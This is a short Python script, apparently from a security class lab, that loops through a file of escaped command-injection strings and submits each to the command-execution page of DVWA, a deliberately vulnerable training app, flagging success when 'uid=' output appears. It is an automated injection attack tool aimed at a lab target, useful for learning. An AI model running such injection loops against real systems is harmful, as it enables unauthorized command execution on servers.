from bs4 import BeautifulSoup
import requests
import time
import re

with open("escaped_commands.txt") as cfile:
    commands = cfile.readlines()

cookies_jar = requests.cookies.RequestsCookieJar()
cookies_jar.set('PHPSESSID','an11cd3fo8soeb1mar55pprnj7')
cookies_jar.set('security','low')

for command in commands:
    command = command.replace('\r','').replace('\n','')
    url = 'http://x/DVWA/vulnerabilities/exec/#'
    params = {'ip': command,'Submit': 'Submit'}
    r = requests.post(url ,params ,auth=('itp270','itp270'), cookies=cookies_jar, )
    parseHTML = BeautifulSoup(r.text, 'html.parser')
    htmlDiv = parseHTML.find('div',{'class': 'vulnerable_code_area'})

    print("trying %s:\n %s \n" % (url, command))
    if re.findall(r'.*uid\=.*', str(htmlDiv)):
        print("SUCCESS - command output found")
        print("-+"*40)
        commands = None
        break

